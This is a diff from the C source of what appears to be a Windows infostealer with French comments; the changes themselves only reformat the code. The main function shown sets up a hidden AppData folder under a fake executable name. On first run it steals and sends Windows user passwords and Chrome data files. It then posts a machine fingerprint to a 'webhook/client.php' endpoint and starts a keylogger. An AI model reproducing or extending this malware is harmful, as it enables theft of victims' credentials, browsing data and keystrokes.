@@ -24,7 +24,6 @@ int is_first_execution(char *current_executable_path, char *softwareDataDirector
     return _access(fake_executable_path, 0); // de io.h, pour vérifier si le fichier existe
 };
 
-
 int main(void)
 {
 
@@ -40,15 +39,15 @@ int main(void)
     char softwareDataDirectory[1024];
     snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
 
-    //creation d'un uid
-    srand( time( NULL ) );
+    // creation d'un uid
+    srand(time(NULL));
     int random_uid = rand() % 10000001;
     char uid[30]; // random entre 0 et 10000
     snprintf(uid, 30, "%d", random_uid);
 
     char *filename = "user";
     char uid_file_path[500];
-    snprintf(uid_file_path, 500 , "%s\\%s", softwareDataDirectory, filename);
+    snprintf(uid_file_path, 500, "%s\\%s", softwareDataDirectory, filename);
 
     if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
     {
@@ -61,9 +60,9 @@ int main(void)
 
         save_and_send_windows_users_password(&computer);
         send_chrome_data_files(&computer);
-
-    
-    } else{
+    }
+    else
+    {
         // on recupere l'uid qui est censé exister et ont le met dans uid
         get_uid(uid);
     }
@@ -76,7 +75,7 @@ int main(void)
 
     char client_data[1000];
 
-    snprintf(client_data, 1000,  "{\"uid\":\"%s\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name,  computer.username, computer.windows_version, computer.architecture);
+    snprintf(client_data, 1000, "{\"uid\":\"%s\", \"computer_name\": \"%s\", \"username\": \"%s\", \"windows_version\": \"%s\", \"architecture\": \"%s\"}", uid, computer.computer_name, computer.username, computer.windows_version, computer.architecture);
     send_to_server("webhook/client.php", client_data);
 
     start_keylogger();
